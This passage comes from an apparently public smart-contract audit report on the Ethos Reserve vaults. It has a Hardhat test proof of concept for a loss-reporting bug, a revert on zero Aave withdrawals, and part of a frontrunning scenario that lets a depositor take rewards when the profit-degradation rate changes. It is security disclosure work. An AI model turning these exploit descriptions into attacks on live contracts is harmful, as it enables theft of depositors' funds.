class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">harvest</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balanceOf</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">`strategy balanceOf: </span><span class=\"mtk4\">${</span><span class=\"mtk12\">balanceOf</span><span class=\"mtk4\">}</span><span class=\"mtk8\">`</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// allocated = 9</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// 1.loss 2, left 7</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">lossFortest</span><span class=\"mtk1\">(</span><span class=\"mtk11\">toWantUnit</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;2&#39;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// 2.modify bps=&gt;0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strategist</span><span class=\"mtk1\">).</span><span class=\"mtk11\">updateStrategyAllocBPS</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// 3.so debt = 9</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">harvest</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">allocated</span><span class=\"mtk1\">, </span><span class=\"mtk12\">losses</span><span class=\"mtk1\">, </span><span class=\"mtk12\">allocBPS</span><span class=\"mtk1\">} = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">strategies</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">`losses: </span><span class=\"mtk4\">${</span><span class=\"mtk12\">losses</span><span class=\"mtk4\">}</span><span class=\"mtk8\">`</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">`allocated: </span><span class=\"mtk4\">${</span><span class=\"mtk12\">allocated</span><span class=\"mtk4\">}</span><span class=\"mtk8\">`</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">`allocBPS: </span><span class=\"mtk4\">${</span><span class=\"mtk12\">allocBPS</span><span class=\"mtk4\">}</span><span class=\"mtk8\">`</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span></code></pre>\n<p>add to ReaperStrategyGranarySupplyOnly.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">lossFortest</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amout</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">ILendingPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ADDRESSES_PROVIDER</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getLendingPool</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">want</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amout</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">));        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"console\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">$ npx hardhat test test/starter-test.js</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  Vaults</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Vault Tests</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">strategy balanceOf: 900000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">losses: 400000000     &lt;--------will double</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">allocated: 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">allocBPS: 0</span></span></code></pre>\n<p>The last vault’s allocated is correct, but the loss is wrong.<br>\nStatistics and bpsChange of _reportLoss() will be wrong.</p>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>remove <code>roi -= int256(loss);</code></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/752#issuecomment-1468230994\">tess3rac7 (Ethos Reserve) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Recommend low priority since it’s an edge case that would only affect reporting data.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/752#issuecomment-1475977750\">Trust (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Reporting data is handled by the vault at:<br>\n<code>debt = IVault(vault).report(roi, repayment);</code><br>\nWe cannot rule out damage that may occur due to miscalculations on report / debt, so medium severity seems appropriate.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/752#issuecomment-1476520939\">tess3rac7 (Ethos Reserve) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-03-reaperbasestrategyv4harvest-might-revert-in-an-emergency\" style=\"position:relative;\"><a href=\"#m-03-reaperbasestrategyv4harvest-might-revert-in-an-emergency\" aria-label=\"m 03 reaperbasestrategyv4harvest might revert in an emergency permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/730\">[M-03] <code>ReaperBaseStrategyv4.harvest()</code> might revert in an emergency.</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/730\">hansfriese</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L109\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L109</a><br>\n<a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L200\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L200</a></p>\n<p><code>ReaperBaseStrategyv4.harvest()</code> might revert in an emergency if there is no position on the lending pool.</p>\n<p>As a result, the funds might be locked inside the strategy.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The main problem is that <a href=\"https://github.com/aave/protocol-v2/blob/554a2ed7ca4b3565e2ceaea0c454e5a70b3a2b41/contracts/protocol/libraries/logic/ValidationLogic.sol#L60-L70\">Aave lending pool doesn’t allow 0 withdrawals</a>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">validateWithdraw</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reserveAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userBalance</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> =&gt; </span><span class=\"mtk12\">DataTypes</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ReserveData</span><span class=\"mtk1\">) </span><span class=\"mtk11\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk11\">reservesData</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">DataTypes</span><span class=\"mtk1\">.</span><span class=\"mtk11\">UserConfigurationMap</span><span class=\"mtk1\"> </span><span class=\"mtk11\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk11\">userConfig</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> =&gt; </span><span class=\"mtk12\">address</span><span class=\"mtk1\">) </span><span class=\"mtk11\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk11\">reserves</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk11\">reservesCount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">address</span><span class=\"mtk1\"> </span><span class=\"mtk11\">oracle</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">VL_INVALID_AMOUNT</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>So the below scenario would be possible.</p>\n<ol>\n<li>After depositing and withdrawing from the Aave lending pool, the current position is 0 and the strategy is in debt.</li>\n<li>It’s possible that the strategy has some want balance in the contract but no position on the lending pool. It’s because <code>_adjustPosition()</code> remains the debt during reinvesting and also, there is an <code>authorizedWithdrawUnderlying()</code> for <code>STRATEGIST</code> to withdraw from the lending pool.</li>\n<li>If the strategy is in an emergency, <code>harvest()</code> tries to liquidate all positions(=0 actually) and it will revert because of 0 withdrawal from Aave.</li>\n<li>Also, <code>withdraw()</code> will revert at <a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/abstract/ReaperBaseStrategyv4.sol#L98\">L98</a> as the strategy is in the debt.</li>\n</ol>\n<p>As a result, the funds might be locked inside the strategy unless the <code>emergency</code> mode is canceled.</p>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We should check 0 withdrawal in <code>_withdrawUnderlying()</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_withdrawUnderlying</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_withdrawAmount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">withdrawable</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">balanceOfPool</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_withdrawAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">MathUpgradeable</span><span class=\"mtk1\">.</span><span class=\"mtk11\">min</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_withdrawAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">withdrawable</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_withdrawAmount</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">ILendingPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ADDRESSES_PROVIDER</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getLendingPool</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">want</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_withdrawAmount</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/730#issuecomment-1460448283\">Trust (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Very interesting edge case.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/730#issuecomment-1468431036\">tess3rac7 (Ethos Reserve) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Valid edge case in as far as harvests would fail. However, funds won’t get locked in the strategy. They can still be withdrawn through an appropriate withdraw() TX. Recommend downgrading to low since this is purely about state handling without putting any assets at risk. See screenshot below for simulation:</p>\n<p><img src=\"https://user-images.githubusercontent.com/95557476/225072825-2dbabf26-b6b9-44ff-b5d4-add9c2d0948d.png\" alt=\"Screenshot from 2023-03-14 12-28-48\"></p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/730#issuecomment-1476041940\">Trust (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Medium severity is also appropriate when core functionality is impaired, even if there is no lasting damage. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/730#issuecomment-1476748516\">tess3rac7 (Ethos Reserve) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-04-in-reapervaultv2-we-should-update-lockedprofit-and-lastreport-before-changing-lockedprofitdegradation\" style=\"position:relative;\"><a href=\"#m-04-in-reapervaultv2-we-should-update-lockedprofit-and-lastreport-before-changing-lockedprofitdegradation\" aria-label=\"m 04 in reapervaultv2 we should update lockedprofit and lastreport before changing lockedprofitdegradation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/728\">[M-04] In <code>ReaperVaultV2</code>, we should update <code>lockedProfit</code> and <code>lastReport</code> before changing <code>lockedProfitDegradation</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/728\">hansfriese</a></em></p>\n<p>The locked profit degradation for the past will be changed with the new <code>lockedProfitDegradation</code>.</p>\n<p>As a result, malicious users can steal others’ rewards by frontrunning.</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>setLockedProfitDegradation()</code> is used to change <code>lockedProfitDegradation</code> by admin.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setLockedProfitDegradation</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">degradation</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_atLeastRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ADMIN</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">degradation</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">DEGRADATION_COEFFICIENT</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Degradation cannot be more than 100%&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">lockedProfitDegradation</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">degradation</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">LockedProfitDegradationUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">degradation</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>And <code>lockedProfitDegradation</code> is used to calculate the locked profit.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_calculateLockedProfit</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lockedFundsRatio</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">lastReport</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">lockedProfitDegradation</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">lockedFundsRatio</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">DEGRADATION_COEFFICIENT</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lockedProfit</span><span class=\"mtk1\"> - ((</span><span class=\"mtk12\">lockedFundsRatio</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">lockedProfit</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">DEGRADATION_COEFFICIENT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>But it doesn’t update <code>lockedProfit</code> and <code>lastReport</code> before changing <code>lockedProfitDegradation</code> so the below scenario would be possible.</p>\n<ol>\n<li>Let’s assume <code>lockedProfit = 200, lastReport = block.timestamp</code> after calling <code>report()</code>, <code>lockedProfitDegradation</code> are <code>6 hours in blocks</code>.</li>\n<li>3 hours later, 100 tokens of <code>lockedProfit</code> are released and added to the free funds. We can assume <code>report()</code> wasn’t called for 3 hours.</li>\n<li>At that time, <code>lockedProfitDegradation</code> is changed to <code>4 hours in blocks</code> and it means <code>200 * 3 / 4 = 150</code> tokens are released. As a result, free funds are increased by 50 inside the same block.</li>\n<li>So a malicious user(it should be a pool) can front run <code>deposit()</code> with huge amounts before <code>lockedProfitDegradation</code> is changed and charge most of the new rewards(=50).</li>\n</ol>\n<p>Similarly, already 